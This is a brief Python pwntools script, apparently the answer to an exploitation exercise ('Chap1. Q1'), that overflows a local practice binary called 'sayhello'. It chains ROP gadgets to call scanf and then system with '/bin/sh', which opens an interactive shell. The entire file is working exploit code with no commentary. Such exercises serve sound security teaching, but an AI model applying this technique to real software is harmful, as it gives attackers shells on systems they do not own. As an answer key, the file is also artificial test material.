#!/usr/bin/python -i

# answer to Chap1. Q1

from pwn import *

r = process('./sayhello')

pop_rdi = 0x400673
pop_rsi_r15 = 0x400671
plt_scanf = 0x4004a0
plt_system = 0x400470

p = ''
p += cyclic(24)
p += p64(pop_rdi)
p += p64(0x400694)  # rdi
p += p64(pop_rsi_r15)
p += p64(0x601100)  # rsi
p += p64(0xdedeadbeef)  # r15
p += p64(plt_scanf)
p += p64(pop_rdi)
p += p64(0x601100)  # rdi
p += p64(plt_system)
p += cyclic(128)

r.send(p + '\n')

#r.sendline('Thisismyreign!!!')
r.sendline('/bin/sh')

r.interactive()
